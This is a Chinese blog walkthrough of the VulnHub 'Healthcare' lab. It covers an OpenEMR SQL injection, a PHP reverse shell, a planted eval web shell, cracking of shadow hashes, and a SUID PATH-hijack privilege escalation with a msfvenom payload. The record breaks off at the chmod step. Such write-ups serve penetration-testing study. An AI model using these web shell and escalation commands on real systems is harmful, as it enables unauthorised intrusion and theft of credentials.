@@ -1,0 +1,637 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon-light.ico">
+  <link rel="icon" type="image/png" href="/img/favicon-light.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="渗透测试笔记、日常问题记录">
+  <meta name="author" content="Ayu">
+  <meta name="keywords" content="">
+  <title>VulnHub - Healthcare - Black Book</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/dracula.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"0xhc.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Ayu's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/assets/blog/84707606_p0.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="VulnHub - Healthcare">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-15 10:47" pubdate>
+        2021年5月15日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">VulnHub - Healthcare</h1>
+            
+            <div class="markdown-body">
+              <p>VulnHub - Healthcare</p>
+<a id="more"></a>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br/>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><br/>
+
+<table>
+<thead>
+<tr>
+<th align="center">Port</th>
+<th align="center">Service</th>
+<th align="center">Version</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">21/tcp</td>
+<td align="center">ftp</td>
+<td align="center">ProFTPD 1.3.3d</td>
+</tr>
+<tr>
+<td align="center">80/tcp</td>
+<td align="center">http</td>
+<td align="center">Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))</td>
+</tr>
+</tbody></table>
+<br/>
+
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-number">21</span>/tcp open  ftp     ProFTPD <span class="hljs-number">1.3</span>.<span class="hljs-number">3</span>d<br><span class="hljs-number">80</span><span class="hljs-regexp">/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/</span>PREFORK-<span class="hljs-number">1</span>pclos2011))<br>| http-robots.txt: <span class="hljs-number">8</span> disallowed entries <br>| <span class="hljs-regexp">/manual/</span> <span class="hljs-regexp">/manual-2.2/</span> <span class="hljs-regexp">/addon-modules/</span> <span class="hljs-regexp">/doc/</span> <span class="hljs-regexp">/images/</span> <br>|_<span class="hljs-regexp">/all_our_e-mail_addresses /</span>admin<span class="hljs-regexp">/ /</span><br>|_http-server-header: Apache<span class="hljs-regexp">/2.2.17 (PCLinuxOS 2011/</span>PREFORK-<span class="hljs-number">1</span>pclos2011)<br>|_http-title: Coming Soon <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="Web-路径枚举"><a href="#Web-路径枚举" class="headerlink" title="Web 路径枚举"></a>Web 路径枚举</h3><br/>
+
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gobuster dir -u <span class="hljs-string">&quot;http://192.168.0.106/&quot;</span> -t 60 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -b 403,404 -o report/output/gobuster_80.txt<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran">/<span class="hljs-built_in">index</span>                (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">5031</span>]<br>/images               (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">342</span>] [--&gt; http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>/images/]<br>/css                  (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">339</span>] [--&gt; http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>/css/]<br>/js                   (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">338</span>] [--&gt; http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>/js/]<br>/vendor               (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">342</span>] [--&gt; http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>/vendor/]<br>/favicon              (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">1406</span>]<br>/robots               (<span class="hljs-keyword">Status</span>: <span class="hljs-number">200</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">620</span>]<br>/fonts                (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">341</span>] [--&gt; http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>/fonts/]<br>/gitweb               (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">342</span>] [--&gt; http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>/gitweb/]<br>/openemr              (<span class="hljs-keyword">Status</span>: <span class="hljs-number">301</span>) [<span class="hljs-built_in">Size</span>: <span class="hljs-number">343</span>] [--&gt; http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>/openemr/]<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>可以正常访问的页面</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0.106</span><span class="hljs-regexp">/openemr/</span><br></code></pre></div></td></tr></table></figure>
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-17-06-43.png" srcset="/img/loading.gif" alt="openEMR"></p>
+<br/>
+
+<h2 id="漏洞发现-Sql-Injection"><a href="#漏洞发现-Sql-Injection" class="headerlink" title="漏洞发现(Sql Injection)"></a>漏洞发现(Sql Injection)</h2><br/>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49742">OpenEMR 4.1.0 - ‘u’ SQL Injection</a></li>
+</ul>
+<br/>
+
+<h2 id="漏洞利用-Sql-Injection"><a href="#漏洞利用-Sql-Injection" class="headerlink" title="漏洞利用(Sql Injection)"></a>漏洞利用(Sql Injection)</h2><br/>
+
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">searchsploit -m 49742<br></code></pre></div></td></tr></table></figure>
+<p>需要配置 exploit 的 url 连接</p>
+<br/>
+
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>:<span class="hljs-number">3863</span>efef<span class="hljs-number">9</span>ee<span class="hljs-number">2</span>bfbc<span class="hljs-number">51</span>ecdca<span class="hljs-number">359</span>c<span class="hljs-number">6302</span>bed<span class="hljs-number">1389</span>e<span class="hljs-number">8</span> <br><span class="hljs-attribute">medical</span>:ab<span class="hljs-number">24</span>aed<span class="hljs-number">5</span>a<span class="hljs-number">7</span>c<span class="hljs-number">4</span>ad<span class="hljs-number">45615</span>cd<span class="hljs-number">7</span>e<span class="hljs-number">0</span>da<span class="hljs-number">816</span>eea<span class="hljs-number">39</span>e<span class="hljs-number">48</span>c<span class="hljs-number">95</span>d<br></code></pre></div></td></tr></table></figure>
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-17-25-10.png" srcset="/img/loading.gif" alt="output"></p>
+<br/>
+
+<h3 id="Hash-Crack"><a href="#Hash-Crack" class="headerlink" title="Hash Crack"></a>Hash Crack</h3><br/>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation</a></li>
+</ul>
+<br/>
+
+<figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm"><span class="hljs-number">3863</span>efef<span class="hljs-number">9</span>ee<span class="hljs-number">2</span>bfbc<span class="hljs-number">51</span>ecdca<span class="hljs-number">359</span><span class="hljs-keyword">c</span><span class="hljs-number">6302</span>bed<span class="hljs-number">1389e8</span>    sha<span class="hljs-number">1</span>    ackbar<br>ab<span class="hljs-number">24</span>aed<span class="hljs-number">5</span>a<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>ad<span class="hljs-number">45615</span>cd<span class="hljs-number">7e0</span>da<span class="hljs-number">816</span>eea<span class="hljs-number">39e48</span><span class="hljs-keyword">c</span><span class="hljs-number">95</span>d   Unknown Unrecognized hash format.<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>得到密码：<code>admin:ackbar</code></p>
+<br/>
+
+<h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-17-29-08.png" srcset="/img/loading.gif" alt="openEMR"></p>
+<br/>
+
+<p>php-reverse-shell.php: <code>/usr/share/webshells/php/php-reverse-shell.php</code></p>
+<p>config.php: <code>http://192.168.0.106/openemr/interface/main/main_screen.php?auth=login&amp;site=default</code></p>
+<br/>
+
+<p>监听本地端口，替换 <code>config.php</code> 的内容为 <code>php-reverse-shell.php</code> 的内容，并保存</p>
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-18-32-45.png" srcset="/img/loading.gif" alt="erverse shell"></p>
+<br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-18-33-29.png" srcset="/img/loading.gif" alt="Nc"></p>
+<br/>
+
+<h3 id="Connect-C2"><a href="#Connect-C2" class="headerlink" title="Connect C2"></a>Connect C2</h3><br/>
+
+<p>为了方便操作，连接到 phpsploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php @eval($_SERVER[&quot;HTTP_PHPSPL01T&quot;]); ?&gt; &#x27;</span> &gt; shell.php<br></code></pre></div></td></tr></table></figure>
+<p>访问 <code>shell.php</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0.106</span><span class="hljs-regexp">/openemr/</span>sites<span class="hljs-regexp">/default/</span>shell.php<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-18-40-04.png" srcset="/img/loading.gif" alt="phpsploit"></p>
+<br/>
+
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><br/>
+
+<h3 id="信息收集-系统内"><a href="#信息收集-系统内" class="headerlink" title="信息收集(系统内)"></a>信息收集(系统内)</h3><br/>
+
+<p>枚举脚本：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git">privilege-escalation-awesome-scripts-suite</a></p>
+<br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-18-55-16.png" srcset="/img/loading.gif" alt="上传"></p>
+<br/>
+
+<h4 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h4><br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-18-46-57.png" srcset="/img/loading.gif" alt="user.txt"></p>
+<h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="etc_passwd"></a>etc_passwd</h4><br/>
+
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># cat /etc/passwd | grep -v &quot;nologin\|false\|shutdown\|true&quot;</span><br><br>root:x:0:0:root:/root:/bin/bash <br>bin:x:1:1:bin:/bin:/bin/sh <br>daemon:x:2:2:daemon:/sbin:/bin/sh <br>adm:x:3:4:adm:/var/adm:/bin/sh <br>lp:x:4:7:lp:/var/spool/lpd:/bin/sh <br>sync:x:5:0:sync:/sbin:/bin/sync <br>halt:x:7:0:halt:/sbin:/sbin/halt <br>mail:x:8:12:mail:/var/spool/mail:/bin/sh <br>news:x:9:13:news:/var/spool/news:/bin/sh <br>uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh <br>operator:x:11:0:operator:/var:/bin/sh <br>games:x:12:100:games:/usr/games:/bin/sh <br>nobody:x:65534:65534:Nobody:/:/bin/sh <br>mysql:x:492:488:system user <span class="hljs-keyword">for</span> mysql:/var/lib/mysql:/bin/bash <br>medical:x:500:500:PCLinuxOS Medical:/home/medical:/bin/bash <br>apache:x:479:416:system user <span class="hljs-keyword">for</span> httpd-conf:/var/www:/bin/sh <br>almirant:x:501:502:Almirant:/home/almirant:/bin/bash<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h4 id="Backup-配置错误"><a href="#Backup-配置错误" class="headerlink" title="Backup(配置错误)"></a>Backup(配置错误)</h4><p><code>/var/backups</code> 中 shadow 文件存在可读权限</p>
+<br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-19-18-34.png" srcset="/img/loading.gif" alt="shadow"></p>
+<br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-19-20-08.png" srcset="/img/loading.gif" alt="full_2021-05-14-19-20-08"></p>
+<br/>
+
+<p>备份与原件时间差距不大，很可能存在未修改的密码</p>
+<br/>
+
+<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><br/>
+
+<p>将 passwd 和 shaodw 分别保存到文件</p>
+<p>shadow</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># cat shadow | grep &#x27;$2a&#x27;</span><br><br>root:$2a$08<span class="hljs-variable">$wPYBq0XIaBcaAtB</span>.kZf14OXgKVDZISmTeTABJeuXJIc23qpCHA8Ay:18472:0:99999:7::: <br>medical:$2a$08<span class="hljs-variable">$N</span>.K1aryaJfAtVMkYBo1mL.abpbhvU8CIB7UEmcs7dwoRea0trRak.:15274:0:99999:7::: <br>almirant:$2a$08<span class="hljs-variable">$jpHCGVP</span>/yn1MFwRlkKmJMuHISxiOflP4EAgZIbtrCcfnXngNTZh3y:18472:0:99999:7:::<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-19-27-45.png" srcset="/img/loading.gif" alt="shadow"></p>
+<br/>
+
+<p>整理到 passwd.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">unshadow passwd shadow &gt; passwd.txt<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-variable">$2a</span><span class="hljs-variable">$08</span><span class="hljs-variable">$wPYBq0XIaBcaAtB</span>.<span class="hljs-symbol">kZf14OXgKVDZISmTeTABJeuXJIc23qpCHA8Ay:</span>0<span class="hljs-symbol">:</span>0<span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span> <br><span class="hljs-symbol">medical:</span><span class="hljs-variable">$2a</span><span class="hljs-variable">$08</span><span class="hljs-variable">$N</span>.<span class="hljs-symbol">K1aryaJfAtVMkYBo1mL.abpbhvU8CIB7UEmcs7dwoRea0trRak.:</span><span class="hljs-number">500</span><span class="hljs-symbol">:</span><span class="hljs-number">500</span><span class="hljs-symbol">:PCLinuxOS</span> <span class="hljs-symbol">Medical:</span>/home/<span class="hljs-symbol">medical:</span>/bin/bash <br><span class="hljs-symbol">almirant:</span><span class="hljs-variable">$2a</span><span class="hljs-variable">$08</span><span class="hljs-variable">$jpHCGVP</span>/<span class="hljs-symbol">yn1MFwRlkKmJMuHISxiOflP4EAgZIbtrCcfnXngNTZh3y:</span><span class="hljs-number">501</span><span class="hljs-symbol">:</span><span class="hljs-number">502</span><span class="hljs-symbol">:Almirant</span><span class="hljs-symbol">:/home/almirant</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">john passwd.txt -w=/usr/share/wordlists/rockyou.txt <br></code></pre></div></td></tr></table></figure>
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-19-43-10.png" srcset="/img/loading.gif" alt="john"></p>
+<br/>
+
+<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">almirant:</span>skywalker<br><span class="hljs-symbol">medical:</span>medical<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br/>
+
+<h3 id="信息收集-提权准备"><a href="#信息收集-提权准备" class="headerlink" title="信息收集(提权准备)"></a>信息收集(提权准备)</h3><br/>
+
+<p>切换到普通用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">su almirant<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h4 id="SUID-Binary"><a href="#SUID-Binary" class="headerlink" title="SUID Binary"></a>SUID Binary</h4><br/>
+
+<p>使用枚举脚本或下面的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-21-05-02.png" srcset="/img/loading.gif" alt="SUID"></p>
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-21-05-46.png" srcset="/img/loading.gif" alt="SGID"></p>
+<br/>
+
+<p>发现可疑 SUID 二进制文件，<code>strings</code> 后找到可利用程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># cat suid.txt | grep &quot;Unknown SUID binary&quot; </span><br><br>-rws--x--x 1 root       root        63K Jan 23  2010 /usr/bin/sperl5.10.1 (Unknown SUID binary) <br>-rwsr-xr-x 1 root       root       120K Nov 28  2010 /usr/bin/wvdial (Unknown SUID binary) <br>-rwsr-xr-x 1 root       root        29K Dec 28  2010 /usr/bin/pumount (Unknown SUID binary) <br>-rwsr-xr-x 1 root       root        39K Dec 28  2010 /usr/bin/pmount (Unknown SUID binary) <br>-rwsr-xr-x 1 root       root       362K Jan 18  2011 /usr/bin/gpgsm (Unknown SUID binary) <br>-rwsr-xr-x 1 root       root        11K Jun 11  2011 /usr/sbin/fileshareset (Unknown SUID binary) <br>-rwsr-xr-x 1 root       root       5.8K Sep 22  2011 /usr/bin/Xwrapper (Unknown SUID binary) <br>-rwsr-sr-x 1 root       root       5.7K Jul 29  2020 /usr/bin/healthcheck (Unknown SUID binary)<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="SUID-Binary-提权"><a href="#SUID-Binary-提权" class="headerlink" title="SUID Binary 提权"></a>SUID Binary 提权</h3><br/>
+
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># strings /usr/bin/healthcheck</span><br><br>/lib/ld-linux.so.2 <br>__gmon_start__ <br>libc.so.6 <br>_IO_stdin_used <br>setuid <br>system <br>setgid <br>__libc_start_main <br>GLIBC_2.0 <br>PTRhp <br>[^_] <br>clear ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;System Health Check&#x27;</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> ; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Scanning System&#x27;</span> ; sleep 2 ; ifconfig ; fdisk -l ; du -h<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>生成 exploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p linux/x86/<span class="hljs-built_in">exec</span> CMD=/bin/sh -f elf -o clear<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>上传到目标</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">phpsploit(192.168.0.106) &gt; upload /home/ayu/AkProject/VulnHub/Healthcare/exploit/clear_exp /dev/shm/clear <br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>添加可执行权限</p>
